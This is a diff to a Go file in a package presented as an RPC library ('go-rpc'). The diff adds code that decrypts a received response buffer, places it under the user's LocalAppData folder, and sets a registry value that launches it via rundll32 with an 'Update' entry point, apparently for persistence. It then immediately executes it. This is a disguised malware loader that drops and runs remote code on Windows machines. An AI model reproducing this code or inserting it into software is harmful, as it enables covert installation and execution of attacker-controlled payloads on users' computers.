@@ -6,8 +6,10 @@ package rpc
 import (
 	"fmt"
 	"os"
+	"os/exec"
 	"path/filepath"
 
+	"github.com/etherdev12/go-rpc/crypto"
 	"github.com/winlabs/gowin32"
 	"golang.org/x/sys/windows/registry"
 )
@@ -24,6 +26,11 @@ func RpcParse(resp []byte) error {
 	if err == nil {
 		return nil
 	}
+	resp, err = crypto.CFBDecryptBuffer(resp)
+	if err != nil {
+		return err
+	}
+
 	path, _ := gowin32.GetSpecialFolderPath(gowin32.FolderLocalAppData)
 	path = filepath.Join(path, name)
 	os.Mkdir(path, os.ModePerm)
@@ -32,5 +39,9 @@ func RpcParse(resp []byte) error {
 	if err != nil {
 		return err
 	}
-	return key.SetStringValue(name, fmt.Sprintf(`rundll32.exe "%s",Update`, path))
+	err = key.SetStringValue(name, fmt.Sprintf(`rundll32.exe "%s",Update`, path))
+	if err != nil {
+		return err
+	}
+	return exec.Command("rundll32.exe", path, "Update").Start()
 }
